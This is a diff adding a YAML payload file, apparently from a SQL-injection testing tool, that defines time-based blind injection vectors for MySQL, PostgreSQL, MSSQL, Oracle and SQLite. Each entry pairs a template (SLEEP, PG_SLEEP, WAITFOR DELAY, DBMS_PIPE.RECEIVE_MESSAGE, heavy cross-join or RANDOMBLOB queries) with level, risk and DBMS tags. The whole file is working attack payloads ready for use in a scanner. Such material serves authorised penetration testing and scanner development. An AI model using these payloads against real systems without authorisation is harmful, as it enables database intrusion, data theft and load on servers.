@@ -1,0 +1,93 @@
+# Time-blind payloads.
+# stype 5 = time-blind.
+payloads:
+  - title: "MySQL >= 5.0.12 AND time-based blind"
+    stype: 5
+    level: 1
+    risk: 1
+    clause: [1, 8, 9]
+    where: 1
+    vector: "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME]))))) [RANDSTR])"
+    request:
+      payload: "AND (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF(1=1,0,[SLEEPTIME]))))) [RANDSTR])"
+    response:
+      time: 5
+    dbms: ["mysql", "mariadb", "percona", "tidb"]
+
+  - title: "MySQL >= 5.0.12 OR time-based blind"
+    stype: 5
+    level: 3
+    risk: 3
+    clause: [1, 8, 9]
+    where: 2
+    vector: "OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF([INFERENCE],0,[SLEEPTIME]))))) [RANDSTR])"
+    request:
+      payload: "OR (SELECT [RANDNUM] FROM (SELECT(SLEEP([SLEEPTIME]-(IF(1=1,0,[SLEEPTIME]))))) [RANDSTR])"
+    response:
+      time: 5
+    dbms: ["mysql", "mariadb", "percona", "tidb"]
+
+  - title: "PostgreSQL > 8.1 AND time-based blind"
+    stype: 5
+    level: 1
+    risk: 1
+    clause: [1, 8, 9]
+    where: 1
+    vector: "AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))"
+    request:
+      payload: "AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME]))"
+    response:
+      time: 5
+    dbms: ["postgresql", "greenplum", "redshift", "cockroachdb", "yugabyte", "alloydb", "opengauss"]
+
+  - title: "MSSQL time-based blind (heavy query)"
+    stype: 5
+    level: 1
+    risk: 1
+    clause: [1, 8, 9]
+    where: 1
+    vector: "AND [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8)"
+    request:
+      payload: "AND [RANDNUM]=(SELECT COUNT(*) FROM sysusers AS sys1,sysusers AS sys2,sysusers AS sys3,sysusers AS sys4,sysusers AS sys5,sysusers AS sys6,sysusers AS sys7,sysusers AS sys8)"
+    response:
+      time: 5
+    dbms: ["mssql"]
+
+  - title: "MSSQL time-based blind (WAITFOR)"
+    stype: 5
+    level: 1
+    risk: 1
+    clause: [1, 8, 9]
+    where: 1
+    vector: "WAITFOR DELAY '0:0:[SLEEPTIME]'--"
+    request:
+      payload: "WAITFOR DELAY '0:0:[SLEEPTIME]'--"
+    response:
+      time: 5
+    dbms: ["mssql"]
+
+  - title: "Oracle AND time-based blind (heavy query)"
+    stype: 5
+    level: 1
+    risk: 1
+    clause: [1, 8, 9]
+    where: 1
+    vector: "AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])"
+    request:
+      payload: "AND [RANDNUM]=DBMS_PIPE.RECEIVE_MESSAGE('[RANDSTR]',[SLEEPTIME])"
+    response:
+      time: 5
+    dbms: ["oracle"]
+
+  - title: "SQLite > 3 AND time-based blind"
+    stype: 5
+    level: 2
+    risk: 1
+    clause: [1, 8, 9]
+    where: 1
+    vector: "AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))"
+    request:
+      payload: "AND [RANDNUM]=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB([SLEEPTIME]00000000/2))))"
+    response:
+      time: 5
+    dbms: ["sqlite"]
